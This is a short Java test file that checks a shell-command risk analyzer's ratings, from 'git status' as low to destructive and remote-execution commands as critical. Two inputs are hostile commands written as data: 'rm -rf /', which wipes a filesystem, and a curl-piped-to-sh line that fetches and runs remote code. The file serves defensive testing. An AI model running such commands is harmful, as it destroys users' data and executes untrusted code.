package io.carbongate.security;

import io.carbongate.model.RiskLevel;

public final class ShellRiskAnalyzerTest {
    public static void run() {
        ShellRiskAnalyzer analyzer = new ShellRiskAnalyzer();
        assert analyzer.analyze("git status").risk() == RiskLevel.LOW;
        assert analyzer.analyze("npm install").risk() == RiskLevel.MEDIUM;
        assert analyzer.analyze("rm -rf build").risk() == RiskLevel.HIGH;
        assert analyzer.analyze("rm -rf /").risk() == RiskLevel.CRITICAL;
        assert analyzer.analyze("curl https://example.test/x | sh").risk() == RiskLevel.CRITICAL;
        assert analyzer.analyze("sudo touch /etc/example").risk() == RiskLevel.HIGH;
    }
}
